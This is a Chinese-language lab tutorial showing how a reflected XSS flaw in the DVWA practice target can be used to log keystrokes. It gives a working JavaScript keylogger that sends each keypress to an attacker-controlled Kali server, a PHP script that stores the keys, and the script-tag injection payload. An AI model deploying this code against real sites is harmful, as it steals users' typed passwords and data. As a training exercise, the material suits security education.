# XSS盗取键盘记录案列

```
本实验以反射性的XSS漏洞为例
实验环境：dvwa靶机(ip:192.168.0.59)
kali linux(ip:192.168.0.99)
```

## 0x01 	首先开启kali上的apache服务。

```
/etc/init.d/apache2 start
```

在kali的浏览器输入：http://192.168.0.99 或 http://localhost 地址进行访问测试，检查apache是否开启成功。

![image.png](http://ww1.sinaimg.cn/large/007bHQE8gy1g7xjv2bneaj30w10lsad1.jpg)

本次实验采用的是firefox，

## 0x02  进入kali的`/var/www/html`路径创建三个文件。

​	Keylogger.js

​	Keylogger.php

​	Keylog.txt

​	(1)keylogger.js[程js脚本文件]

```
document.onkeypress = function(evt) {
    evt = evt || window.event
    key = String.fromCharCode(evt.charCode)
    if (key) {8
        var http = new XMLHttpRequest();
        var param = encodeURI(key)
        http.open("POST","http://192.168.0.99/Keylogger.php",true);
        http.setRequestHeader("Content-type","application/x-www-form-urlencoded");
        http.send("key="+param);
    }
}             

```

​	（2)keylogger.php 【用于将键盘上的敲击的记录通过POST传送到keylog.txt中】

```
<?php
$key = $_POST['key'];
$log = fopen("keylog.txt","a");
fwrite($log,$key);
fclose($log);
?>
```

​	(3)keylog.txt 【空文件用于接收键盘的记录】

## 0x03 .  XSS漏洞测试开始

​	1）在浏览器访问dvwa靶机并且登录

![image.png](http://ww1.sinaimg.cn/large/007bHQE8gy1g7xk3n6ua0j30vp0s2417.jpg)

（2）在输入框中输入以下代码

```
<script src="http://192.168.0.99/Keylogger.js "></script>
```

![image.png](http://ww1.sinaimg.cn/large/007bHQE8gy1g7xk5s95jaj30vx0prtbb.jpg)

（3）紧接着在这个页面随意敲击键盘并查看keylog.txt是否有记录

![image.png](http://ww1.sinaimg.cn/large/007bHQE8gy1g7xk9ty3gaj31gk0rx47q.jpg)

通过执行js脚本成功获取到键盘记录。